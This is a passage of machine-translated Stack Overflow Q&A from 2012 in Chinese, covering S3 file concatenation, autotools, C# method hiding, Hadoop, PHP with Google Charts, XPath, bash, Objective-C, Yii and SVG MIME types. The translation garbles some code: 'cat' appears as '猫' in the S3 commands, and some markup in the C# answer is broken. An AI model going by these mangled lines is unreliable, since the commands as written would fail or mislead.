Plain:       -4  252  252 0xFC        252
Signed:      -3  253   -3 0xFD 4294967293
Unsigned:    -3  253  253 0xFD        253
Plain:       -3  253  253 0xFD        253
Signed:      -2  254   -2 0xFE 4294967294
Unsigned:    -2  254  254 0xFE        254
Plain:       -2  254  254 0xFE        254
Signed:      -1  255   -1 0xFF 4294967295
Unsigned:    -1  255  255 0xFF        255
Plain:       -1  255  255 0xFF        255 
```

在 Mac OS X 10.7.4 上使用 GCC 4.7.1 编译（但使用平台上的标准 C 库）。

# amazon-s3 - 连接 Amazon S3 存储桶中的文件

> ID：11603326
> 
> 赞同：2
> 
> 时间：2012-07-22T19:26:30.403
> 
> 标签：amazon-s3

我在 EC2 上的不同虚拟机 (VM) 上运行 5 个不同的进程，创建 5 个不同的文件（f1.txt、f2.txt、f3.txt、f4.txt、f5.txt）。这些虚拟机大致在同一时间启动，但将在不同时间完成。

# 我需要

~ 等待这5个文件被写出

~ 合并它们并创建一个新文件 egftxt = f1.txt + f2.txt + f3.txt + f4.txt + f5.txt

~ 问题：# 我如何确定所有 5 个文件何时都准备好并写出？# 我可以使用 s3cat 或一些类似的命令行工具来做到这一点吗？s3cat 是否与 Unix cat 具有相似的语义，例如 cat s3://mybucket/f1.txt > s3://mybucket/f.txt cat s3://mybucket/f2.txt >> s3://mybucket/f.txt猫 s3://mybucket/f3.txt >> s3://mybucket/f.txt 猫 s3://mybucket/f4.txt >> s3://mybucket/f.txt 猫 s3://mybucket/f5 .txt >> s3://mybucket/f.txt

```
Their examples on GitHub didn’t show this use case. 
```

生成的输出文件 (f.txt) 供下游进程使用。

* * *

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:25:25.020

如果您知道要上传的 5 个文件所使用的密钥的名称，则可以轮询它们。如果你知道 python，boto 是一个很好的与 s3 接口的模块，可以轻松处理上述问题。此外，s3 确实保证文件在完全上传之前不会显示给其他客户端，因此您不必担心读取部分文件。

如果您已经在使用 Boto 检查文件，它也是连接输出的好方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-05T13:17:20.067

我*认为*您想使用分段上传，而不是上传一堆文件并将它们分类

# c - autotools Makefile 是否自动将包含的头文件视为依赖项？

> ID：11603329
> 
> 赞同：5
> 
> 时间：2012-07-22T19:26:55.160
> 
> 标签：c, makefile, autotools, automake

我有一个具有以下结构的自动工具管理项目（[此处为](https://docs.google.com/open?id=0Bw9sT8pzNEH7Y3ZNM3FaWjlQaFk)[sscce](http://pastebin.com/p9d1XNcU) tar.gz 包）：

[`./main.c`](http://pastebin.com/dMPNukHi)
[`./foo.c`](http://pastebin.com/p9d1XNcU)
[`./foo/foo.h`](http://pastebin.com/xN0UQWeR)

我`configure.ac`的是：

```
AC_INIT([foo], [1.0], [foo@bar.ba])
AM_INIT_AUTOMAKE([foreign -Wall -Werror])
AC_PROG_CC
AC_CONFIG_HEADERS([config.h])
AC_CONFIG_FILES([Makefile])

AC_OUTPUT 
```

我`Makefile.am`的是：

```
bin_PROGRAMS = main
main_SOURCES = main.c foo.c foo.h 
```

它编译并完美运行......但后来我注意到我`Makefile.am`的不正确。它表明我的主要代码依赖于`foo.h`，但真正的文件是`foo/foo.h`. 我更改了它，并且编译按预期工作，就像以前一样：

```
bin_PROGRAMS = main
main_SOURCES = main.c foo.c foo/foo.h 
```

然而，这让我想知道：当依赖关系错误时它是如何工作的？它工作得非常好，我什至可以编辑`foo/foo.h`并`make`重新编译依赖文件。实际上，我什至可以从依赖项中删除头文件......

```
bin_PROGRAMS = main
main_SOURCES = main.c foo.c 
```

...并且它仍然会被扫描并会触发依赖文件的重新编译。

所以，我的问题是：

*   自动工具生成的如何`Makefile`知道这是在调用`foo/foo.h`期间要分析的依赖项？`make`
*   我应该将头文件添加到`main_SOURCES`变量中吗？
*   在第一种情况下不应该`make`失败，因为我声明一个不存在的文件是一个依赖项？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T23:17:11.573

看看[automake 手册](http://www.gnu.org/software/automake/manual/automake.html#Dependencies)。作为编译的副作用，依赖关系计算是在构建时完成的。[依赖跟踪](http://www.gnu.org/software/automake/history/html_node/Dependency-Tracking-Evolution.html)的历史可能对您来说也很有趣。请注意，此处的手册中有一个错误：它听起来像是`depcomp`无条件调用，但事实并非如此（`configure`有时会检查您的编译器是否可以不使用它：请`@am__fastdepCC_TRUE@`参阅`Makefile.in`.

因此，列出每个对象的依赖关系的文件存储在一个名为`.deps`. 这些文件最初是空的，并在编译相应的源文件时被覆盖。（对于`gcc`，这是通过`-MD`和相关标志完成的。）

您绝对应该在`main_SOURCES`变量中列出您的标题，以便您`Makefile`在运行时将它们打包`make dist`（或者更好的是，`make distcheck`）。

`make`如果您列出不存在的标头，则不会失败，因为您实际上并未`main_SOURCES`在行中列出依赖项。`automake`将处理该分配，然后写出构建规则`main`（仅取决于目标文件）和各种目标文件（通过后缀规则）。标头不是构建过程中任何内容的**直接**输入文件，因此您可以滑过。`make dist`在您的示例项目上运行会出现错误：

```
make: *** No rule to make target `foo.h', needed by `distdir'.  Stop. 
```

# ssis - 如何在 ssis 中添加非相加计算度量

> ID：11603330
> 
> 赞同：2
> 
> 时间：2012-07-22T19:27:04.540
> 
> 标签：ssis, measure

我有 3 个在派生列转换中计算的非加性度量。现在，我进行了聚合转换以将我的加性度量总结为最后 3 个我没有将它们放在聚合中但是当我试图将我的度量插入事实时表最后 3 没有出现！如何将它们插入事实表中我应该使用另一个转换，它是什么？ ![在此处输入图像描述](../Images/5d4719631f3a2d0d07a103cb8fda31b2.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T22:12:54.327

问题是聚合转换不允许您访问非聚合数据。

最好的办法是在聚合转换之后移动派生列转换。否则，我在回答这个问题时介绍了如何访问这些数据[使用 SSIS，我如何找到人口最多的城市？](https://stackoverflow.com/questions/8080979/using-ssis-how-do-i-find-the-cities-with-the-largest-population/8082874#8082874)

# c# - 派生类新方法应该覆盖但不是

> ID：11603335
> 
> 赞同：0
> 
> 时间：2012-07-22T19:28:30.327
> 
> 标签：c#, unit-testing

只是好奇是否有解决方案而不使基类方法虚拟并且派生方法标记为覆盖：

我希望它跳转到派生方法中，将属性设置为 true（出于测试目的，几乎就像这是一个模拟），但它正在跳转到基类中。唯一的解决方案是使基础虚拟化，我想我可以在派生中将其标记为新的，这样就可以了。

```
 public class SomeClass
   {
      private readonly IFoo _foo;

      public SomeClass(IFoo foo)
      {
         _foo = foo;
      }

      public void DoSomething()
      {
         _foo.DoFoo();
      }
   }

   public interface IFoo
   {
      void DoFoo();
   }

   public class Foo : IFoo
   {
      public void DoFoo()
      {

      }
   }

   public class Foo2 : Foo
   {
      public bool DoFooWasCalled { get; set; }

      public new void DoFoo()
      {
         DoFooWasCalled = true;
         base.DoFoo();
      }
   } 
```

这是失败的测试：

```
 [TestFixture]
   public class TestingCSInheritance
   {
      [Test]
      public void TestMethod()
      {
         var foo = new Foo2();
         var someClass = new SomeClass(foo);
         someClass.DoSomething();
         foo.DoFooWasCalled.ShouldBe(true);
      }
   } 
```

我的猜测是，因为我正在使用带有接口的依赖注入，所以它使用的是基类，但我不确定为什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T19:37:11.693

> 唯一的解决方案是使基础虚拟化，我想我可以在派生中将其标记为新的，这样就可以了。

不会。如果您创建一个新方法，*只有*知道编译时类型为的表达式的代码`Foo2`才会调用`Foo2.DoSomething`.

即使`TestMethod`知道`foo`as a `Foo2`，`SomeClass.DoSomething`也只知道 as `IFoo`，所以它只是使用`IFoo`实现。`Foo2.DoSomething`不是. *_* _`IFoo`

您需要多态性，但您已经通过不使用虚拟方法有效地丢弃了它。

唯一的其他选择是在 Foo2 中*重新实现* `IFoo`，这是 Sergey 描述的解决方案。请注意，这最终会产生一些非常混乱的代码。任何类型的方法隐藏几乎总是如此。从根本上说，如果你想要虚拟方法的效果，你应该使用虚拟方法......

或者，如果您使用组合而不是继承，它会更干净：

```
public class MockFoo : IFoo
{
    private readonly Foo foo = new Foo();
    private bool doSomethingWasCalled;

    public void DoSomething()
    {
        doSomethingWasCalled = true;
        foo.DoSomething();
    }
} 
```

这将调用*委托*给`DoSomething`而不是尝试处理继承层次结构。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T19:33:00.540

尝试像这样更改您的`Foo2`声明：

```
public class Foo2 : Foo, IFoo 
```

# hadoop - 在 map/reduce 任务中拆分键/值输入文件

> ID：11603338
> 
> 赞同：0
> 
> 时间：2012-07-22T19:28:47.470
> 
> 标签：hadoop, mapreduce

我有一个具有以下输入文件的 MapReduce 任务

```
File1    value1
File1    value2
File2    value3
File2    value4 
```

映射器将访问文件名并搜索其中的特定值。

问：我想要一种优化技术来优化这些文件的磁盘访问。我需要将相同的文件 ID 分配给相同的映射器。所以我可以确保文件一次只能由一项任务访问。

示例：必填

```
Mapper 1: File1 (value1), File1 (value2)
Mapper 2: File2 (value3), File2 (value4) 
```

不需要：

```
Mapper 1: File1 (value1), File2 (value3)
Mapper 2: File1 (value2), File2 (value4) 
```

有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T03:30:44.183

可以谦虚的建议你使用reducer来达到你想要的效果。

将一个键的所有值放到同一个任务中就是“减少”的定义。

如果需要进一步减少，请在第一个输出上运行另一个作业。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:56:19.880

我想这

```
 File1    value1
 File1    value2
 File2    value3
 File2    value4 
```

写入现有文件

确保您想要的方法是按第一列对此输入文件进行排序（并将其存储排序）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-23T00:52:44.627

我认为在不对输入数据进行分区的情况下将特定数据发送到地图任务是不可能的。根据需要对输入数据进行分区并使用[TextFileInputFormar.isSplittable()](http://wiki.apache.org/hadoop/FAQ#How_do_I_get_each_of_a_job.27s_maps_to_work_on_one_complete_input-file_and_not_allow_the_framework_to_split-up_the_files.3F)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-23T13:47:44.970

图片中有 2 个文件，您肯定会有至少 2 个映射，默认 TextInputFormat 作为 hadoop 输入格式。

您所要做的就是创建一个扩展 TextInputFormat 的自定义 InputFormat 并覆盖**isSplittable()**方法以返回**false**。在这种情况下，一个文件将由一个映射器完全处理，而下一个文件将由另一个完全处理。

# php - 在 HTML 中使用 PHP 中的 var 的最简单方法

> ID：11603340
> 
> 赞同：-1
> 
> 时间：2012-07-22T19:29:07.597
> 
> 标签：php, html

我正在使用谷歌图表，我需要从 PHP 文件（或 HTML 文件中的 php？）中获取数据以将数据提供给图表。那么我将如何做到这一点，并确保在绘制图表之前获取数据。我已经在研究如何使用 PHP 从 Mysql 数据库中获取数据

这是我需要放入 vars 的代码

```
<html>
  <head>
    <!--Load the AJAX API-->
    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
    <script type="text/javascript">

      // Load the Visualization API and the piechart package.
      google.load('visualization', '1.0', {'packages':['corechart']});

      // Set a callback to run when the Google Visualization API is loaded.
      google.setOnLoadCallback(drawChart);

      // Callback that creates and populates a data table,
      // instantiates the pie chart, passes in the data and
      // draws it.
      function drawChart() {

        // Create the data table.
        var data = new google.visualization.DataTable();
        data.addColumn('string', 'Color');
        data.addColumn('number', 'Votees ');
        data.addRows([
          ['Value from Mysql', 3000],
          ['Value2 from Mysql', 13000],

        ]);

        // Set chart options
        var options = {'title':'Table Name From MySql',
                       'width':600,
                       'height':450};

        // Instantiate and draw our chart, passing in some options.
        var chart = new google.visualization.PieChart(document.getElementById('chart_div'));
        chart.draw(data, options);
      }
    </script>
  </head>

  <body>
    <!--Div that will hold the pie chart-->
      <div id="chart_div"></div> 

  </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:35:18.697

HTML 中没有这样的变量 - 我认为您的意思是您希望能够将 PHP 值与您用于 Google 图表的代码一起使用。我没有太多使用 Goggle 图表的经验，但据[我](https://developers.google.com/chart/interactive/docs/basic_load_libs)所知，它使用了一些 JavaScript API。也许您正在寻找一种将您的值转换为 JavaScript 变量的方法，以便您在处理图表插件时可以使用它们。

这正是 PHP 的用途 - 采用静态静态内容并嵌入脚本为其提供动态内容。

例如，你可以让你的 PHP 初始化一个 JavaScript 变量——

```
<?php
  $some_php_var = 'overflow';
?>

<script type="text/javascript">
  var stack = '<?php echo $some_php_var; ?>';
</script> 
```

现在您将调用一个 JavaScript 变量`stack`，其值将是“溢出”。

* * *

可以在任何地方使用相同的技术——甚至在变量定义的中间。让我们以您的代码为例-

```
// Set chart options
var options = {
  'title':'<?php echo $dbResult['Table Name'] ?>',
  'width':600,
  'height':450
}; 
```

...

```
data.addRows([
  ['<?php echo $dbResult['value1']; ?>', 3000],
  ['<?php echo $dbResult['value2']; ?>', 13000],
]); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T19:35:19.667

您可以像这样从 PHP 中插入值：

```
 <?php echo $myVariableName; ?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T19:35:20.527

最简单的例子：在一个 PHP 文件中，比如 index.php

```
<!DOCTYPE>
<html>
<head>
<meta charset="UTF-8" />
</head>
<body>
<?php
echo $the_data_as_a_string;
?>
</body> 
```

更好的方法是实际打开一个带有 text/plain 类型的脚本标签并在那里转储数据。

```
<!DOCTYPE>
<html>
<head>
<meta charset="UTF-8" />
</head>
<body>
<script id="the-data" type="text/html" ><?php echo $the_data_as_a_string; ?></script>
<script type="text/javascript" >
    var data = document.getElementById('the-data').innerHTML;
</script>
</body> 
```

顶部的 script 标签不会被浏览器执行，但底部的标签仍然可以作为字符串访问它的内容，并用它做任何需要的事情。

编辑：

优点是您可以安全地编写 .js 文件并将它们包含为静态文件，因此它们将被浏览器缓存。

您还可以包含数据脚本之一，因此即使 html 也是静态的 = 每次都不会更改 = 由浏览器缓存。

请注意，这只是懒人对数据的 ajax 请求，您应该考虑一下。:)

# javascript - 限制 td 之间的空间

> ID：11603344
> 
> 赞同：0
> 
> 时间：2012-07-22T19:29:40.183
> 
> 标签：javascript, html, css, forms

这是我的[表格](http://www.yourfantasyfootballreality.com/createleague.php)

如您所见，信息的左侧和右侧（输入）之间有很多空间。我如何限制这个空间？

```
<html><head><title>Create a League</title></head>

<body>

<center><h1>Create a League</h1></center>

<form action="" method="POST">

 <table cellpadding="0" border="0">
   <tr><td >League Name </td>
     <td> <input name="LeagueName" type="text"> </td>
   </tr>
   <tr><td>Number of Members </td>
     <td><input name="Members" type="text"></td>
   </tr>
   <tr><td>League Password </td>
     <td><input name="LeaguePassword" type="password"></td>
   </tr>
   <tr>
     <td colspan=><input name="Agreement" type="checkbox" value="1"> I agree with the terms of service</td>
   </tr>
   <tr>
     <td colspan=""><input type="submit" value="Register" name="action">
     <input type="reset"  value="Reset"></td>
   </tr>
 </table>
</form>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T19:32:03.487

将复选框所在的单元格的 colspan 修改为**colspan=2**，因为没有它，带有标签的整个复选框都放在左列内。更改后，它将分布在两列中，因此带有标签的左侧不必那么宽。

```
<td colspan=2><input name="Agreement" type="checkbox" value="1"> I agree with the terms of service</td> 
```

# java - 如何使用 XPath 计数表达式来评估 if 语句？

> ID：11603345
> 
> 赞同：4
> 
> 时间：2012-07-22T19:29:51.633
> 
> 标签：java, xml, xpath

我试图弄清楚如何使用 Xpath 表达式来验证 XPath 表达式中是否只有一个匹配节点。这是一些示例 XML：

```
<a>
  <b>
    <c>X:1 Y:0</c>
    <c>X:1 Y:0</c>
    <c>X:2 Y:0</c>
  </b>
  <b>
    <c>X:1 Y:0</c>
    <c>X:2 Y:0</c>
  </b>
</a> 
```

所以，我尝试了类似的代码，但它不起作用：

```
XPathFactory factory = XPathFactory.newInstance();
XPath xpath = factory.newXPath();
try {           
    XPathExpression expr = xpath.compile( "count(//a/b/c)" ) );
} catch ( XPathExpressionException e ) {
    printErr( e );
}
if ( expr == true ) {
  // edit XML node
} 
```

据说有一种方法可以让 count 表达式返回 Boolean = true 。我怎么得到这个？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-22T19:50:38.723

也许是这样的：

```
XPathExpression xpr = xpath.compile("count(//a/b/c)");
System.out.println(xpr.evaluate(n, XPathConstants.NUMBER));

xpr = xpath.compile("count(//a/b/c) = 5");
System.out.println(xpr.evaluate(n, XPathConstants.BOOLEAN)); 
```

其中 n 是文档中的节点/元素

第一次打印 5.0，第二次打印 true

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-22T19:48:03.333

您只编译了一个 XPath 表达式，并没有实际评估它。

请注意，您可以使用 直接评估表达式[`XPath.evaluate()`](http://docs.oracle.com/javase/6/docs/api/javax/xml/xpath/XPath.html#evaluate%28java.lang.String,%20org.xml.sax.InputSource%29)：

```
result = xpath.evaluate("count(//a/b/c)", input); 
```

或使用您的预编译`expr`：

```
result = expr.evaluate(input); 
```

并且这些`evaluate`方法还可以将类型作为附加参数，例如[`XPathConstants.BOOLEAN`](http://docs.oracle.com/javase/6/docs/api/javax/xml/xpath/XPathConstants.html#BOOLEAN).

所以这将适用于您`input`的[`InputSource`](http://docs.oracle.com/javase/6/docs/api/org/xml/sax/InputSource.html)XML：

```
XPathExpression expr = xpath.compile("count(//a/b/c) = 5");
Object retval = expr.evaluate(input, XPathConstants.BOOLEAN);

if ((Boolean) retval)
    // edit XML node 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T23:21:22.710

**您可以使用**：

```
count(//a/b/c) = 1 
```

这评估为`true()`当且仅当`count(//a/b/c)`评估为`1`--`false()`否则。

但是，这可能效率不高（导致对 XPath 表达式进行完整评估并计算所有节点）。

**更高效的 XPath 表达式**：

```
(//a/b/c)[1] and not( (//a/b/c)[2] ) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-22T19:43:52.287

怎么样`//a/b/c[count(*) != 0]`？另外，如果我记得 XPathExpression 返回一个对象，您必须将其转换为原始类型，即 xpath Number to Double 等。

# linux - Bash：从文本文件 VAR=VALUE 格式读取变量

> ID：11603349
> 
> 赞同：1
> 
> 时间：2012-07-22T19:30:42.167
> 
> 标签：linux, bash, parsing, variables, text-files

我想将文本文件中的一些变量加载到我的批处理脚本中。我尝试搜索，但我只找到文件的提示，如

```
VALUE1
VALUE2
... 
```

**我的**文本文件具有以下格式：

```
VER=123
MIN_VER=123456789
TARGET_VER=132456790 
```

而且我希望能够加载这个文件，以便我可以访问三个变量以将其与 bash 中的数字进行匹配。我怎样才能做到这一点？

* * *

回答！谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T19:35:49.637

将变量保存到您想要的文件（VAR = VAL）并运行：

```
. ./your_file 
```

~~也许这个文件的开头必须有“#!/bin/bash”。~~错误的

# objective-c - UIKit 中是否有内置事件处理的基/实用程序类？

> ID：11603352
> 
> 赞同：1
> 
> 时间：2012-07-22T19:30:53.860
> 
> 标签：objective-c, ios, uikit, selector, performselector

我正在寻找一个具有类似于 UIButton 工作方式的“事件列表”的类，您可以在其中添加多个目标和选择器。

编写一个很容易，但如果 Apple 已经提供了解决方案，我宁愿使用它也不愿维护更多代码。

*笔记：*

这是一个非可视类，所以我真的不想使用任何 UI 特定的东西。

*编辑：*

我最终使用堆叠的 NSDictionary 实例滚动了我自己的基本事件调度程序类型类。

```
@implementation ControllerBase
@synthesize eventHandlers;

- (id) init
{
    self = [super init];

    if (self!=NULL)
    {
        NSMutableDictionary* dict = [[NSMutableDictionary alloc] init];
        [self setEventHandlers: dict];

        [dict release];
    }

    return self;
}

-(void) addTarget: (id) target  action:(SEL) selector  forEvent:(NSString*) eventName
{
    NSString* selectorString =  NSStringFromSelector(selector);   
    NSMutableDictionary* eventDictionary = [eventHandlers objectForKey:eventName];

    if (eventDictionary==NULL)
    {
        eventDictionary = [[NSMutableDictionary alloc] init];
        [eventHandlers setValue:eventDictionary forKey:eventName];
    }

    NSArray* array = [NSArray arrayWithObjects:selectorString,target, nil];
    [eventDictionary setValue:array forKey: [target description]];
}

-(void) removeTarget: (id) target  action:(SEL) selector  forEvent:(NSString*) eventName;
{
    NSMutableDictionary* eventDictionary = [eventHandlers objectForKey:eventName];

    //must have already been removed
    if (eventDictionary!=NULL)
    {
        //remove event
        [eventDictionary removeObjectForKey:target];

        //remove sub dictionary
        if ([eventDictionary count]==0)
        {
            [eventHandlers removeObjectForKey:eventName];
            [eventDictionary release];
        }
    }

}

-(void) fireEvent:(NSString *)eventName
{
     NSMutableDictionary* eventDictionary = (NSMutableDictionary*) [eventHandlers objectForKey:eventName];

    if (eventDictionary!=NULL)
    {
        for(id key in eventDictionary)
        {
            NSArray* eventPair= [eventDictionary valueForKey:key];

            if (eventPair!=NULL)
            {

                NSString* selectorString = (NSString*)[eventPair objectAtIndex:0];

                //remove colon at end
                SEL selector = NSSelectorFromString ( [selectorString substringWithRange: NSMakeRange(0, [selectorString length]-1)] ) ;
                id target = [eventPair objectAtIndex:1];

                [target performSelector:selector];
            }

        }
    }

}

-(void) dealloc
{
    for(id key in eventHandlers) 
    {
        NSMutableDictionary* eventDictionary = (NSMutableDictionary*) [eventHandlers objectForKey:key];

        for(id key in eventDictionary)
        {
            [eventDictionary removeObjectForKey:key];
        }

        [eventDictionary release];

    }

    [eventHandlers release];
    [super dealloc];
}

@end 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T19:36:59.460

`UIButton`是 的子类`UIControl`。 `UIControl`管理每个控制事件的目标/动作列表。它有一组预定义的控制事件，例如`UIControlEventTouchUpInside`和`UIControlEventValueChanged`。每个控制事件都由掩码中的一个位表示。`UIControlEventApplicationReserved = 0x0F000000`位掩码有四位为应用程序定义的事件 ( )保留。

如果`UIControl`没有做您想做的事，您将需要推出自己的事件管理。

# ios - IOS Facebook SSO：通过 Facebook 应用登录时 isSessionValid() 返回 false

> ID：11603364
> 
> 赞同：0
> 
> 时间：2012-07-22T19:33:16.857
> 
> 标签：ios, facebook, ios5

我正在使用 Objective C 开发一个 IOS5.1 应用程序。我已经为本地 IOS 应用程序[http://developers.facebook.com/docs/reference/iossdk/authentication/](http://developers.facebook.com/docs/reference/iossdk/authentication/)为我的应用程序登录功能实现了 facebook SSO。

我的应用程序的流程从 loginViewController 开始。当用户在我的应用程序中单击登录按钮时，应用程序将检查 isSessionValid()。如果该方法返回 true，用户将被引导到下一页。在配置的手机上进行模拟期间，我当前的应用程序能够将我定向到移动 safari 网络浏览器（如果没有 facebook 应用程序）或 facebook 应用程序。当我通过 safari Web 浏览器登录时，isSessionValid() 返回 true 并将我定向到下一个视图页面。但是，如果配置的 Iphone 中有 facebook 应用程序，当我单击应用程序中的登录按钮时会弹出 facebook 应用程序。facebook 应用程序显示一个带有活动指示器“正在加载...”的白页，然后它将我引导回我的应用程序。当我再次单击登录按钮时，facebook 应用程序再次弹出。这变成了一个无限循环。

这是我的代码：

在 AppDelegate.h 中：

```
@interface AppDelegate : UIResponder <UIApplicationDelegate>
{
    NSMutableDictionary *userPermissions;
}
@property (nonatomic, retain) Facebook *facebook;
@property (nonatomic, retain) UIWindow *window;
@property (nonatomic, retain) LoginViewController *loginvc; 
```

在 AppDelegate.m 中：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:    (NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard" bundle:nil];
    self.loginvc = [storyboard instantiateInitialViewController];
    self.window.rootViewController = loginvc;

    facebook = [[Facebook alloc] initWithAppId:@"facebookID" andDelegate:self.loginvc];

    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    if ([defaults objectForKey:@"FBAccessTokenKey"] 
        && [defaults objectForKey:@"FBExpirationDateKey"]) {
        facebook.accessToken = [defaults objectForKey:@"FBAccessTokenKey"];
        facebook.expirationDate = [defaults objectForKey:@"FBExpirationDateKey"];
    }

    // Initialize user permissions
    userPermissions = [[NSMutableDictionary alloc] initWithCapacity:1];

    [self.window makeKeyAndVisible];
    return YES;
}

- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation 
{
    return [self.facebook handleOpenURL:url]; 
} 
```

在 LoginViewController.m 中：

```
- (IBAction)loginViaFacebook:(id)sender
{
    AppDelegate *delegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];
    if (![[delegate facebook] isSessionValid]) {
        [[delegate facebook] authorize:permissions];
    } else {
        [self performSegueWithIdentifier:@"signup" sender:self];
    }
}

- (void)fbDidLogin {
    AppDelegate *delegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    [defaults setObject:[[delegate facebook] accessToken] forKey:@"FBAccessTokenKey"];
    [defaults setObject:[[delegate facebook] expirationDate] forKey:@"FBExpirationDateKey"];
    [defaults synchronize];
} 
```

... 所有必要的 facebook 协议都在 LoginViewController.m 中实现。

我正在使用故事板。故事板中使用的起始 ViewController 是 LoginViewController。我确定当通过移动 safari 网络浏览器登录但不是通过 facebook 应用程序登录时 facebook sso 工作。

希望有人知道答案。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T22:57:48.967

根据 Facebook 文档[https://developers.facebook.com/docs/mobile/ios/build/#implementsso](https://developers.facebook.com/docs/mobile/ios/build/#implementsso)上的 SSO 实施，您必须在 AppDelegate.h 代表上实施：

```
@interface AppDelegate : UIResponder <UIApplicationDelegate,UIApplicationDelegate, FBSessionDelegate> 
```

希望这会有所帮助。

# javascript - 如何使用 Extendscript 为 Illustrator 创建自定义菜单？

> ID：11603366
> 
> 赞同：2
> 
> 时间：2012-07-22T19:34:06.220
> 
> 标签：javascript, menu, adobe-illustrator, extendscript

救命！使用 Adob​​e InDesign，使用扩展脚本创建自定义菜单很容易，只需将其放入 Startup Scripts 文件夹即可 - 您可以通过这种方式获得自定义菜单命令，它就像一个魅力。

我怎样才能为 Illustrator 做到这一点？也许它在那里，但我在 Illustrator 的对象模型中找不到任何`menu`方法，而且我用于 InDesign 的相同脚本不适用于 Illustrator。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-23T11:09:47.770

由于 DOM 似乎不提供对任何菜单对象的任何访问，因此对我来说似乎是死路一条。至于在 Illustrator 中删除 indesign 脚本，它不起作用也就不足为奇了。这两个应用程序都只有非常有限的一组公共对象。

# yii - 未定义属性“CWidgetFactory.CGridView”

> ID：11603368
> 
> 赞同：0
> 
> 时间：2012-07-22T19:34:34.487
> 
> 标签：yii

这是我的主要布局中的调用：

```
<div id="mainmenu">

        <?php 
                $this->widget('zii.widgets.CMenu',array(
            'items'=>array(
                array('label'=>'Home', 'url'=>array('/site/index')),
                array('label'=>'Services', 'url'=>array('/site/page', 'view'=>'services')),
                array('label'=>'About', 'url'=>array('/site/page', 'view'=>'about')),
                array('label'=>'Contact', 'url'=>array('/site/contact')),
                                array('label'=>'User', 'url'=>array('/user/index')),
                array('label'=>'Login', 'url'=>array('/site/login'), 'visible'=>Yii::app()->user->isGuest),
                array('label'=>'Logout ('.Yii::app()->user->name.')', 'url'=>array('/site/logout'), 'visible'=>!Yii::app()->user->isGuest)
            ),
        )); ?>
    </div> 
```

如果我简单地打电话`$this->widget`，我会得到：

> CException：未定义属性“CWidgetFactory.CGridView”。

这与 main.php 配置文件有关吗？

```
'widgetFactory'=>array(
        'CGridView'=>array(
          'cssFile'=>'/css/gridview/styles.css',
          'selectableRows'=>0,
          'pager'=>array(
            'cssFile'=>'/css/pager.css',
           ),
                ),

               'CListView'=>array(
                 'cssFile'=>'/css/listview/styles.css',
                 'pager'=>array(
                    'cssFile'=>'/css/pager.css',
                 ),
               )
), 
```

我错过了什么吗？我现在被这个错误困住了一段时间。找不到原因。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-02T11:49:51.997

是的，你错过了一些东西。你忘了小部件重叠。

```
'widgetFactory'=>array(
  'widgets' => array(
    'CGridView'=>array(
      'cssFile'=>'/css/gridview/styles.css',
      'selectableRows'=>0,
      'pager'=>array(
        'cssFile'=>'/css/pager.css',
       ),
            ),

           'CListView'=>array(
             'cssFile'=>'/css/listview/styles.css',
             'pager'=>array(
                'cssFile'=>'/css/pager.css',
             ),
           )
   )
), 
```

# c# - IIS 7.5 上的 ASP NET MVC 以正确的类型为 SVG 提供服务

> ID：11603370
> 
> 赞同：1
> 
> 时间：2012-07-22T19:35:05.360
> 
> 标签：c#, razor, svg, asp.net-mvc-4

这与其他问题密切相关，但我的具体问题是为什么这两种情况会产生不同的行为。

1.  `FilePathResult`使用 MIME 类型参数...

    ```
    public FilePathResult PlainLogoSvg()
    {
            return File(Server.MapPath("~/Art/LogoPlain.svg"), "image/svg+xml");
    } 
    ```

    这在视图中

    ```
    <object class="centeredLogo" >
    <embed class="centeredLogo" src="@Url.Action("PlainLogoSvg")"/>
    </object> 
    ```

    在 Chrome 和 FF 上生成嵌入图像。

2.  具有 src 和类型的对象或嵌入元素（任何组合/排列）（此 MIME 类型在 IIS 7.5 上默认配置）...

    ```
    <object class="centeredLogo" src="@Server.MapPath("~/Art/LogoPlain.svg")" type="image/svg+xml" >
    <embed class="centeredLogo" src="@Server.MapPath("~/Art/LogoPlain.svg")" type="image/svg+xml"/>
    </object> 
    ```

    打破 Chrome 和 FF（FF 为插件而哭泣）。使用`Url.Content`Firefox 修复它。

# clojure - 具有多个数据库的 Korma 中的事务代码

> ID：11603377
> 
> 赞同：1
> 
> 时间：2012-07-22T19:35:29.103
> 
> 标签：clojure

